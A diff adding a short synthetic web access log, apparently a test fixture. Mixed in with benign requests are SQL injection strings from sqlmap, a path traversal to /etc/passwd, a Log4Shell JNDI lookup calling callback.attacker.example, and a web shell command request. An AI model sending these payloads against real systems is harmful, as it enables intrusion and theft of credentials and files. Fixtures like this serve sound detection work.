@@ -1,0 +1,8 @@
+127.0.0.1 - - [14/Nov/2026:03:48:02 +0000] "GET / HTTP/1.1" 200 512 "-" "Mozilla/5.0"
+127.0.0.1 - - [14/Nov/2026:03:48:09 +0000] "GET /search?q=latte HTTP/1.1" 200 233 "-" "Mozilla/5.0"
+203.0.113.45 - - [14/Nov/2026:03:50:38 +0000] "GET /search?q=1%27%20union%20select%20password%20from%20users-- HTTP/1.1" 200 233 "-" "sqlmap/1.7"
+203.0.113.45 - - [14/Nov/2026:03:51:02 +0000] "GET /search?q=1%20or%201=1 HTTP/1.1" 200 233 "-" "sqlmap/1.7"
+203.0.113.45 - - [14/Nov/2026:03:51:40 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 96 "-" "curl/8.4.0"
+198.51.100.7 - - [14/Nov/2026:03:55:11 +0000] "GET / HTTP/1.1" 200 512 "-" "${jndi:ldap://callback.attacker.example/a}"
+198.51.100.7 - - [14/Nov/2026:03:56:20 +0000] "GET /wp-content/uploads/cache.php?c=id HTTP/1.1" 200 12 "-" "python-requests/2.31"
+127.0.0.1 - - [14/Nov/2026:04:02:15 +0000] "GET /greet?name=guest HTTP/1.1" 200 140 "-" "Mozilla/5.0"
